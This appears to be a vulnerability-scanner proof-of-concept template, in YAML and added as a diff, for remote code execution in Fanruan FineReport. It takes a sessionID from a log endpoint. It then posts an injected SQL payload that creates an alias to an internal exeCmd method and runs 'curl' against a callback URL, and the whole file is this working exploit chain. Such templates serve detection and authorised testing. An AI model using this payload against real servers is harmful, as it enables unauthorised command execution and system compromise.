@@ -1,0 +1,46 @@
+id: yaml-poc-fanruan-finereport-rce-CT-530497
+info:
+  name: Yaml Poc Fanruan Finereport Rce Ct 530497
+  author: guichen.guo
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-fanruan-finereport-rce-CT-530497'
+  tags: rce
+  reference: []
+http:
+- method: GET
+  path:
+  - /WebReport/ReportServer?op=fr_log&cmd=fg_errinfo&fr_username=admin
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - sessionID
+- method: POST
+  path:
+  - /WebReport/ReportServer?op=fr_dialog&cmd=parameters_d&sessionID={{sessionID}}
+  body: __parameters__={"LABEL1":"TYPE:","TYPE":"6;CREATE ALIAS RUMCMD FOR \"com.fr.chart.phantom.system.SystemServiceUtils.exeCmd\";CALL
+    RUMCMD('curl {{reverseURL}}');select msg, trace, sinfo, logtime from fr_errrecord
+    where 1=1","LABEL3":"START_TIME:","START_TIME":"2020-08-11 00:00","LABEL5":"END_TIME:","END_TIME":"2020-08-11
+    16:41","LABEL7":"LIMIT:","LIMIT":2}
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /WebReport/ReportServer?_={{nowtime}}585&__boxModel__=true&op=page_content&sessionID={{sessionID}}&pn=1
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
